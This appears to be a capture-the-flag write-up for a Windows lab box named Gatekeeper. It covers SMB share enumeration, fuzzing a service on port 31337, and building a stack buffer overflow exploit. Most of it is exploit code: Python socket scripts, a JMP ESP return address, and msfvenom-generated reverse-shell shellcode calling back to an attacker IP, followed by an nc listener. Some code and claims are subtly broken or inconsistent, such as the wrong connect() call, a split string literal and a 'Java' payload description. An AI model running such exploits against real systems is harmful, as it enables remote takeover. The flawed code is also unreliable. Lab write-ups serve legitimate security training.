Today's challenge appears to be a mid-tier windows box with not much to go on. The only 2 questions are what are the user and root flags.

Task1 - Approach the Gates
---------------------------------
Power up the box.

Task2 - Defeat the Gatekeeper and pass through the fire.
--------------------------------

Starting off with a full port scan:


Found an interesting open port.
31337/tcp (Elite)

Logging in with SMB I  see'
```bash
root@ip-10-10-70-233:~# smbclient -L gatekeeper.thm
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to gatekeeper.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

So let's try the Users share:

```bash
root@ip-10-10-70-233:~# smbclient \\\\gatekeeper.thm\\Users
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri May 15 02:57:08 2020
  ..                                 DR        0  Fri May 15 02:57:08 2020
  Default                           DHR        0  Tue Jul 14 08:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 05:54:24 2009
  Share                               D        0  Fri May 15 02:58:07 2020

		7863807 blocks of size 4096. 3862809 blocks available
smb: \> cd Default
smb: \Default\> ls
  .                                 DHR        0  Tue Jul 14 08:07:31 2009
  ..                                DHR        0  Tue Jul 14 08:07:31 2009
  AppData                            DH        0  Tue Jul 14 04:20:08 2009
  Desktop                            DR        0  Tue Jul 14 03:34:59 2009
  Documents                          DR        0  Tue Jul 14 06:08:56 2009
  Downloads                          DR        0  Tue Jul 14 03:34:59 2009
  Favorites                          DR        0  Tue Jul 14 03:34:59 2009
  Links                              DR        0  Tue Jul 14 03:34:59 2009
  Music                              DR        0  Tue Jul 14 03:34:59 2009
  NTUSER.DAT                        AHS   262144  Sun Apr 19 20:51:09 2020
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 09:32:10 2011
  NTUSER.DAT.LOG1                    AH   189440  Sun Apr 19 19:52:07 2020
  NTUSER.DAT.LOG2                    AH        0  Tue Jul 14 03:34:08 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Tue Jul 14 05:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 05:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 05:45:54 2009
  Pictures                           DR        0  Tue Jul 14 03:34:59 2009
  Saved Games                         D        0  Tue Jul 14 03:34:59 2009
  Videos                             DR        0  Tue Jul 14 03:34:59 2009

		7863807 blocks of size 4096. 3862809 blocks available
smb: \Default\> cd Downloads
smb: \Default\Downloads\> ls
  .                                  DR        0  Tue Jul 14 03:34:59 2009
  ..                                 DR        0  Tue Jul 14 03:34:59 2009

		7863807 blocks of size 4096. 3862809 blocks available
smb: \Default\Downloads\> cd ..
smb: \Default\> ls
  .                                 DHR        0  Tue Jul 14 08:07:31 2009
  ..                                DHR        0  Tue Jul 14 08:07:31 2009
  AppData                            DH        0  Tue Jul 14 04:20:08 2009
  Desktop                            DR        0  Tue Jul 14 03:34:59 2009
  Documents                          DR        0  Tue Jul 14 06:08:56 2009
  Downloads                          DR        0  Tue Jul 14 03:34:59 2009
  Favorites                          DR        0  Tue Jul 14 03:34:59 2009
  Links                              DR        0  Tue Jul 14 03:34:59 2009
  Music                              DR        0  Tue Jul 14 03:34:59 2009
  NTUSER.DAT                        AHS   262144  Sun Apr 19 20:51:09 2020
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 09:32:10 2011
  NTUSER.DAT.LOG1                    AH   189440  Sun Apr 19 19:52:07 2020
  NTUSER.DAT.LOG2                    AH        0  Tue Jul 14 03:34:08 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Tue Jul 14 05:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 05:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 05:45:54 2009
  Pictures                           DR        0  Tue Jul 14 03:34:59 2009
  Saved Games                         D        0  Tue Jul 14 03:34:59 2009
  Videos                             DR        0  Tue Jul 14 03:34:59 2009

		7863807 blocks of size 4096. 3862809 blocks available
smb: \Default\> cd AppData
smb: \Default\AppData\> ls
  .                                  DH        0  Tue Jul 14 04:20:08 2009
  ..                                 DH        0  Tue Jul 14 04:20:08 2009
  Local                               D        0  Tue Jul 14 06:08:56 2009
  Roaming                             D        0  Tue Apr 12 09:28:15 2011

		7863807 blocks of size 4096. 3862809 blocks available
smb: \Default\AppData\> cd ..
smb: \Default\> cd ..
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Fri May 15 02:58:07 2020
  ..                                  D        0  Fri May 15 02:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 06:27:17 2020

		7863807 blocks of size 4096. 3862809 blocks available
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (4333.2 KiloBytes/sec) (average 4333.3 KiloBytes/sec)
```

So I found this gatekeeper.exe which I am assuming is the target.

Doing some basic interaction with the script:
```bash
root@ip-10-10-70-233:~# nc gatekeeper.thm 31337
help
Hello help!!!
123
Hello 123!!!
/bin/bash
Hello /bin/bash!!!
`/bin/bash`
Hello `/bin/bash`!!!
$(/bin/bash)
Hello $(/bin/bash)!!!
```


Try some fuzzing:

I found this tool for creating patterns:
https://github.com/ickerwx/pattern

```python
#!/usr/bin/env python2

import sys

import struct

def print_help():

print 'Usage: %s (create | offset) <value> <buflen>' % sys.argv[0]

def pattern_create(length = 8192):

pattern = ''

parts = ['A', 'a', '0']

try:

if not isinstance(length, (int, long)) and length.startswith('0x'):

length = int(length, 16)

elif not isinstance(length, (int, long)):

length = int(length, 10)

except ValueError:

print_help()

sys.exit(254)

while len(pattern) != length:

pattern += parts[len(pattern) % 3]

if len(pattern) % 3 == 0:

parts[2] = chr(ord(parts[2]) + 1)

if parts[2] > '9':

parts[2] = '0'

parts[1] = chr(ord(parts[1]) + 1)

if parts[1] > 'z':

parts[1] = 'a'

parts[0] = chr(ord(parts[0]) + 1)

if parts[0] > 'Z':

parts[0] = 'A'

return pattern

def pattern_offset(value, length = 8192):

try:

if not isinstance(value, (int, long)) and value.startswith('0x'):

value = struct.pack('<I', int(value, 16)).strip('\x00')

except ValueError:

print_help()

sys.exit(254)

pattern = pattern_create(length)

try:

return pattern.index(value)

except ValueError:

return 'Not found'

def main():

if len(sys.argv) < 3 or sys.argv[1].lower() not in ['create', 'offset']:

print_help()

sys.exit(255)

command = sys.argv[1].lower()

num_value = sys.argv[2]

if command == 'create':

print pattern_create(num_value)

elif len(sys.argv) == 4:

print pattern_offset(num_value, sys.argv[3])

if __name__ == '__main__':

main()
```


```
root@ip-10-10-70-233:~# python2.7 pattern.py create 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

root@ip-10-10-70-233:~# nc gatekeeper.thm 31337
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

```

This did crash the application. 

Let's build the exploit script to test further.

```python
import socket

ip = "10.10.12.148"
port = 31337 

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
eol = "\r\n"

buffer = overflow + retn + padding + payload + eol

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(ip, port)
    print("Sending exploit...")
    s.send(buffer)
    print("Done!")
except:
    print("Could not connect.")
```

Sending payload to get EIP offset:

```
root@ip-10-10-70-233:~# python3 exploit.py 
Could not connect.

```

EIP offset is 146

Ok let's update the script and send it again and see if e a

```python 
import socket

ip = "10.10.12.148"
port = 31337 

offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "C" * 400
eol = "\r\n"

buffer = overflow + retn + padding + payload + eol

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(ip, port)
    print("Sending exploit...")
    s.send(buffer)
    print("Done!")
except:
    print("Could not connect.")
```

Ok so sending this overwrote ESP successfully. This means we can redirect execution with an ESP JMP address.

```
root@ip-10-10-70-233:~# python
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x00b51b70 - 0x00b519e0
400
>>> 
```

The following Python code can generate a list of bad characters:
```python
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()
```

```bash
root@ip-10-10-70-233:~# python3 genbad.py 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Ok let's update our script once more:

```python
import socket

ip = "10.10.12.148"
port = 31337 

offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
eol = "\r\n"

buffer = overflow + retn + padding + payload + eol

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(ip, port)
    print("Sending exploit...")
    s.send(buffer)
    print("Done!")
except:
    print("Could not connect.")
```

Restart Immunity + debugger and send again with the new script.

Looks like all characters made it into ESP and we have no characters which are bad expect the \x00 typical bad byte.

Next to find a valid JMP instruction we can use Mona to find it

!mona jmp -e -cbp

080416BF

So we add that as our new retn address (written backwards for extra evilness) into the new script.

First we should also generate a payload with msfvenom with these flags:

-   -p to specify the payload type, in this case, the Java reverse shell
-   LHOST to specify the localhost IP address to connect to
-   LPORT to specify the local port to connect to
-   -f to specify the format
-   -b to specify the bad characters
-   -e to specify the encoder
-   -v to specify the name of the variable used for the shellcode


```bash
root@ip-10-10-70-233:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.70.233 LPORT=443 -e x86/shikata_ga_nai -f exe -b "\x00\x0a" -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xbe\x3e\xa9\xb4\xb4\xdb\xc7\xd9\x74\x24\xf4\x5a"
payload += b"\x31\xc9\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\x4c"
payload += b"\xa7\x56\x41\x4c\x5f\x14\xaa\xac\xa0\x79\x22\x49"
payload += b"\x91\xb9\x50\x1a\x82\x09\x12\x4e\x2f\xe1\x76\x7a"
payload += b"\xa4\x87\x5e\x8d\x0d\x2d\xb9\xa0\x8e\x1e\xf9\xa3"
payload += b"\x0c\x5d\x2e\x03\x2c\xae\x23\x42\x69\xd3\xce\x16"
payload += b"\x22\x9f\x7d\x86\x47\xd5\xbd\x2d\x1b\xfb\xc5\xd2"
payload += b"\xec\xfa\xe4\x45\x66\xa5\x26\x64\xab\xdd\x6e\x7e"
payload += b"\xa8\xd8\x39\xf5\x1a\x96\xbb\xdf\x52\x57\x17\x1e"
payload += b"\x5b\xaa\x69\x67\x5c\x55\x1c\x91\x9e\xe8\x27\x66"
payload += b"\xdc\x36\xad\x7c\x46\xbc\x15\x58\x76\x11\xc3\x2b"
payload += b"\x74\xde\x87\x73\x99\xe1\x44\x08\xa5\x6a\x6b\xde"
payload += b"\x2f\x28\x48\xfa\x74\xea\xf1\x5b\xd1\x5d\x0d\xbb"
payload += b"\xba\x02\xab\xb0\x57\x56\xc6\x9b\x3f\x9b\xeb\x23"
payload += b"\xc0\xb3\x7c\x50\xf2\x1c\xd7\xfe\xbe\xd5\xf1\xf9"
payload += b"\xc1\xcf\x46\x95\x3f\xf0\xb6\xbc\xfb\xa4\xe6\xd6"
payload += b"\x2a\xc5\x6c\x26\xd2\x10\x22\x76\x7c\xcb\x83\x26"
payload += b"\x3c\xbb\x6b\x2c\xb3\xe4\x8c\x4f\x19\x8d\x27\xaa"
payload += b"\xca\xb8\xbd\xf2\xe3\xd5\xc3\xfa\xf2\x9e\x4d\x1c"
payload += b"\x9e\xf0\x1b\xb7\x37\x68\x06\x43\xa9\x75\x9c\x2e"
payload += b"\xe9\xfe\x13\xcf\xa4\xf6\x5e\xc3\x51\xf7\x14\xb9"
payload += b"\xf4\x08\x83\xd5\x9b\x9b\x48\x25\xd5\x87\xc6\x72"
payload += b"\xb2\x76\x1f\x16\x2e\x20\x89\x04\xb3\xb4\xf2\x8c"
payload += b"\x68\x05\xfc\x0d\xfc\x31\xda\x1d\x38\xb9\x66\x49"
payload += b"\x94\xec\x30\x27\x52\x47\xf3\x91\x0c\x34\x5d\x75"
payload += b"\xc8\x76\x5e\x03\xd5\x52\x28\xeb\x64\x0b\x6d\x14"
payload += b"\x48\xdb\x79\x6d\xb4\x7b\x85\xa4\x7c\x8b\xcc\xe4"
payload += b"\xd5\x04\x89\x7d\x64\x49\x2a\xa8\xab\x74\xa9\x58"
payload += b"\x54\x83\xb1\x29\x51\xcf\x75\xc2\x2b\x40\x10\xe4"
payload += b"\x98\x61\x31"
```

The final script should be something like this:

```python
import socket

ip = "10.10.12.148"
port = 31337 

offset = 146
overflow = "A" * offset
retn = "\xbf\x16\x04\x08"
padding = ""
payload =  b""
payload += b"\xbe\x3e\xa9\xb4\xb4\xdb\xc7\xd9\x74\x24\xf4\x5a"
payload += b"\x31\xc9\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\x4c"
payload += b"\xa7\x56\x41\x4c\x5f\x14\xaa\xac\xa0\x79\x22\x49"
payload += b"\x91\xb9\x50\x1a\x82\x09\x12\x4e\x2f\xe1\x76\x7a"
payload += b"\xa4\x87\x5e\x8d\x0d\x2d\xb9\xa0\x8e\x1e\xf9\xa3"
payload += b"\x0c\x5d\x2e\x03\x2c\xae\x23\x42\x69\xd3\xce\x16"
payload += b"\x22\x9f\x7d\x86\x47\xd5\xbd\x2d\x1b\xfb\xc5\xd2"
payload += b"\xec\xfa\xe4\x45\x66\xa5\x26\x64\xab\xdd\x6e\x7e"
payload += b"\xa8\xd8\x39\xf5\x1a\x96\xbb\xdf\x52\x57\x17\x1e"
payload += b"\x5b\xaa\x69\x67\x5c\x55\x1c\x91\x9e\xe8\x27\x66"
payload += b"\xdc\x36\xad\x7c\x46\xbc\x15\x58\x76\x11\xc3\x2b"
payload += b"\x74\xde\x87\x73\x99\xe1\x44\x08\xa5\x6a\x6b\xde"
payload += b"\x2f\x28\x48\xfa\x74\xea\xf1\x5b\xd1\x5d\x0d\xbb"
payload += b"\xba\x02\xab\xb0\x57\x56\xc6\x9b\x3f\x9b\xeb\x23"
payload += b"\xc0\xb3\x7c\x50\xf2\x1c\xd7\xfe\xbe\xd5\xf1\xf9"
payload += b"\xc1\xcf\x46\x95\x3f\xf0\xb6\xbc\xfb\xa4\xe6\xd6"
payload += b"\x2a\xc5\x6c\x26\xd2\x10\x22\x76\x7c\xcb\x83\x26"
payload += b"\x3c\xbb\x6b\x2c\xb3\xe4\x8c\x4f\x19\x8d\x27\xaa"
payload += b"\xca\xb8\xbd\xf2\xe3\xd5\xc3\xfa\xf2\x9e\x4d\x1c"
payload += b"\x9e\xf0\x1b\xb7\x37\x68\x06\x43\xa9\x75\x9c\x2e"
payload += b"\xe9\xfe\x13\xcf\xa4\xf6\x5e\xc3\x51\xf7\x14\xb9"
payload += b"\xf4\x08\x83\xd5\x9b\x9b\x48\x25\xd5\x87\xc6\x72"
payload += b"\xb2\x76\x1f\x16\x2e\x20\x89\x04\xb3\xb4\xf2\x8c"
payload += b"\x68\x05\xfc\x0d\xfc\x31\xda\x1d\x38\xb9\x66\x49"
payload += b"\x94\xec\x30\x27\x52\x47\xf3\x91\x0c\x34\x5d\x75"
payload += b"\xc8\x76\x5e\x03\xd5\x52\x28\xeb\x64\x0b\x6d\x14"
payload += b"\x48\xdb\x79\x6d\xb4\x7b\x85\xa4\x7c\x8b\xcc\xe4"
payload += b"\xd5\x04\x89\x7d\x64\x49\x2a\xa8\xab\x74\xa9\x58"
payload += b"\x54\x83\xb1\x29\x51\xcf\x75\xc2\x2b\x40\x10\xe4"
payload += b"\x98\x61\x31"
eol = "\r\n"

buffer = overflow + retn + padding + payload + eol

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(ip, port)
    print("Sending exploit...")
    s.send(buffer)
    print("Done!")
except:
    print("Could not connect.")
```

Now we just need to setup a listener:

```bash
root@ip-10-10-70-233:~# nc -lnvp 443
Listening on [0.0.0.0] (family 0, port 443)

```

